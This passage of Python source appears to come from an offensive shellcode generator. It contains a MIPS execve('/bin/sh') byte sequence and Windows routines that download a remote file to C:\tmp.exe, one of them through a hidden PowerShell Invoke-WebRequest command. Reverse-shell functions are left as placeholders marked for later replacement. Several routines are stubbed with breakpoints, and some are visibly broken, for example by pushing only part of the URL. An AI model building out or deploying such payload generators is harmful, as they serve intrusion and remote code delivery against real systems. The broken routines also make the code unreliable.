            0x24, 0x0f, 0xff, 0xfd,       # li t7, -3
            0x01, 0xe0, 0x78, 0x27,       # nor t7, t7, zero
            0xaf, 0xaf, 0xff, 0xf8,       # sw t7, -8(sp)
            0xaf, 0xa0, 0xff, 0xfc,       # sw zero, -4(sp)
            0x27, 0xa4, 0xff, 0xf8,       # addiu a0, sp, -8
            0x24, 0x02, 0x0f, 0xab,       # li v0, 0xfab (execve)
            0x01, 0x01, 0x01, 0x0c,       # syscall 0x40404
            
            # /bin/sh string
            0x2f, 0x62, 0x69, 0x6e,       # /bin
            0x2f, 0x73, 0x68, 0x00        # /sh\0
        ])
        
        return bytes(shellcode)

    @staticmethod
    def _x86_download_only(url: str) -> bytes:
        """Generate x86 Windows shellcode to download a file only (no execution)"""
        if not url.startswith("http"):
            raise ValueError("URL must start with http/https")
        url_bytes = url.encode() + b"\x00"
        filename = b"C:\\tmp.exe\x00"
        shellcode = bytearray()
        # Simulate calling URLDownloadToFileA(NULL, url, path, 0, NULL)
        shellcode += b"\x31\xc0"                      # xor eax, eax
        shellcode += b"\x50"                          # push eax (NULL)
        shellcode += b"\x68" + filename[-5:-1]        # push ".exe"
        shellcode += b"\x68" + filename[-9:-5]        # push "\\tmp"
        shellcode += b"\x68" + filename[-13:-9]       # push "C:\\"
        shellcode += b"\x89\xe1"                      # mov ecx, esp (filename)
        shellcode += b"\x50"                          # push eax (NULL)
        shellcode += b"\x68" + url_bytes[-5:-1]       # push last 4 bytes of url
        shellcode += b"\x68" + url_bytes[-9:-5]       # push prev 4 bytes
        shellcode += b"\x68" + url_bytes[-13:-9]      # push prev 4 bytes
        shellcode += b"\x89\xe2"                      # mov edx, esp (url)
        shellcode += b"\x6a\x00"                      # push 0 (dwReserved)
        shellcode += b"\x50"                          # push eax (NULL)
        # Call URLDownloadToFileA (simulate)
        # In real shellcode, would resolve and call the function
        # Here, just a stub for demonstration
        shellcode += b"\xcc"  # int3 (breakpoint, placeholder for call)
        return bytes(shellcode)

    @staticmethod
    def _x64_download_only(url: str) -> bytes:
        """Generate x64 Windows shellcode to download a file only (no execution)"""
        ps_cmd = f"powershell -w hidden -c \"Invoke-WebRequest -Uri {url} -OutFile C:\\\\tmp.exe\""
        cmd_bytes = ps_cmd.encode('utf-8') + b"\x00"
        shellcode = bytearray([
            0x48, 0x31, 0xc0,             # xor rax, rax
            0x50,                         # push rax
        ])
        # Push command string to stack
        for b in reversed(cmd_bytes):
            shellcode += b'\x68' + bytes([b]) + b'\x00'*3  # padded
        # In real shellcode, would resolve and call WinExec or CreateProcessA
        # Here, just a stub for demonstration
        shellcode += bytearray([0xcc])  # int3 (breakpoint, placeholder)
        return bytes(shellcode)

    @staticmethod
    def _x86_windows_reverse_shell(ip: str, port: int) -> bytes:
        """Placeholder for x86 Windows reverse shell shellcode"""
        # TODO: Replace with real Windows x86 reverse shell shellcode
        # For now, just return a NOP sled and int3
        shellcode = b"\x90" * 8 + b"\xcc"  # NOP sled + int3
        return shellcode

    @staticmethod
    def _x64_windows_reverse_shell(ip: str, port: int) -> bytes:
        """Placeholder for x64 Windows reverse shell shellcode"""
        # TODO: Replace with real Windows x64 reverse shell shellcode
        # For now, just return a NOP sled and int3
        shellcode = b"\x90" * 16 + b"\xcc"  # NOP sled + int3
        return shellcode